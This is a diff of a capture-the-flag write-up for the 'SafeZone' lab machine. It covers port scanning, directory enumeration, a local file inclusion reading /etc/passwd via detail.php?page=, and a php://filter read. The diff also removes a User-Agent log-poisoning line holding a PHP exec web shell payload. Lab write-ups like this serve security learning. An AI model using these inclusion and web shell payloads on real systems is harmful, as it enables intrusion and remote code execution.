@@ -1,14 +1,15 @@
-
-
-<br>
-
-<h2 align="center">Port Scanning</h2>
-
-
+<h1>SafeZone</h1>
 
 <br>
+<br>
+<h1>Static Host Mapping</h1>
 
+```bash
+MachineIP safezone.thm
+```
 
+<br>
+<h1>Port Scanning</h1>
 
 ```bash
 :~/challenge# nmap -sC -sV -T4 -Pn -p22,80 safezone.thm
@@ -27,7 +28,7 @@ Nmap done: 1 IP address (1 host up) scanned in 7.40 seconds
 ```
 
 <br>
-<h2 align="center">Directory and File Enumeration</h2>
+<h1>Directory and File Enumeration</h1>
 
 ```bash
 :~/challenge# gobuster dir -u http://safezone.thm/ -w /usr/share/dirb/wordlists/common.txt -t 60 -q -x php,html --exclude-length 277
@@ -120,7 +121,32 @@ Finished
 ```
 
 <br>
-<p><em>note.txt</em></p>
+<h1>Web Discovery</h1>
+
+<br>
+<p>safezone.thm</p>
+
+```bash
+<html>
+    <title>Whoami?</title>
+
+    <body style="background-color:black">
+        <pre style="color:#737CA1;font-size:14px">
+   _____       ____                          
+  / ___/____ _/ __/__  ____  ____  ____  ___ 
+  \__ \/ __ `/ /_/ _ \/_  / / __ \/ __ \/ _ \
+___/ / /_/ / __/  __/ / /_/ /_/ / / / /  __/
+/____/\__,_/_/  \___/ /___/\____/_/ /_/\___/ 
+
+                                            Designed by cyberbot :)
+
+       </pre>
+
+    </body>
+```
+
+<br>
+<p>safezone.thm/note.txt</p>
 
 ```bash
 :~/challenge# curl http://safezone.thm/note.txt
@@ -134,7 +160,7 @@ I can't remember my password always , that's why I have saved it in /home/files/
 ```
 
 <br>
-<p><em>test.php</em></p>
+<p>safezone.thm/test.php</p>
 
 ```bash
 :~/challenge# curl http://safezone.thm/test.php | html2text > test.txt
@@ -195,9 +221,7 @@ $_SERVER['REQUEST_TIME_FLOAT']| 1773602644.143
 $_SERVER['REQUEST_TIME']| 1773602644  
 ```
 
-<p>
-
-- Navigate to http://safezone.thm/~files/</p>
+<p>safezone.thm/~files/</p>
 
 <img width="1017" height="284" alt="image" src="https://github.com/user-attachments/assets/9589e87b-d618-4ffe-9a27-396bfda5d27e" />
 
@@ -221,7 +245,7 @@ admin__admin
 <br>
 <p>
 
-- Register:http://safezone.thm/register.php</p>
+- Register tour account in safezone.thm/register.php</p>
 
 <img width="996" height="463" alt="image" src="https://github.com/user-attachments/assets/d96daf64-4b6b-4380-830a-d876667136fe" />
 
@@ -229,7 +253,7 @@ admin__admin
 <br>
 <p>
 
-- Log in: http://safezone.thm/index.php</p>
+- Log in safezone.thm/index.php</p>
 
 <img width="1004" height="278" alt="image" src="https://github.com/user-attachments/assets/592e08ba-c279-4809-9124-2dd4e00407d8" />
 
@@ -291,17 +315,13 @@ admin__admin
 
 <br>
 <br>
-<p>
-
-- http://safezone.thm/detail.php?page=index.html</p>
+<p>safezone.thm/detail.php?page=index.html</p>
 
 <img width="1043" height="273" alt="image" src="https://github.com/user-attachments/assets/c905416f-e888-464a-97ed-d79133db5ab0" />
 
 <br>
 <br>
-<p>
-
-- Navigate to <code>http://safezone.thm/detail.php?page=index.html</code></p>
+<p>http://safezone.thm/detail.php?page=index.html</p>
 
 <img width="1012" height="515" alt="image" src="https://github.com/user-attachments/assets/429a3909-49b6-447a-96a3-8afc4a13d145" />
 
@@ -309,7 +329,7 @@ admin__admin
 <br>
 <p>
 
-- Navigate to <code>http://safezone.thm/detail.php?page=/etc/passwd</code><br>
+- Navigate to safezone.thm/detail.php?page=/etc/passwd<br>
 - Discover users <code>root</code>, <code>files</code>, and <code>ubuntu</code></p>
 
 <img width="1120" height="584" alt="image" src="https://github.com/user-attachments/assets/7370f182-2857-4e8a-a8fe-d78f86d54328" />
@@ -430,34 +450,6 @@ http://safezone.thm/detail.php?page=php://filter/convert.base64-encode/resource=
 
 
 
-
-
-```bash
-:~/challenge# curl -A '<?php echo exec($_GET[cmd]) ; ?>' http://safezone.thm
-<html>
-<title>Whoami?</title>
-
-<body style="background-color:black">
-<pre style="color:#737CA1;font-size:14px">
-
-   _____       ____                          
-
-  / ___/____ _/ __/__  ____  ____  ____  ___ 
-
-  \__ \/ __ `/ /_/ _ \/_  / / __ \/ __ \/ _ \
-
-___/ / /_/ / __/  __/ / /_/ /_/ / / / /  __/
-
-/____/\__,_/_/  \___/ /___/\____/_/ /_/\___/ 
-
-                                            Designed by cyberbot :)
-
-
-</pre>
-
-
-
-</body>
 
 
 
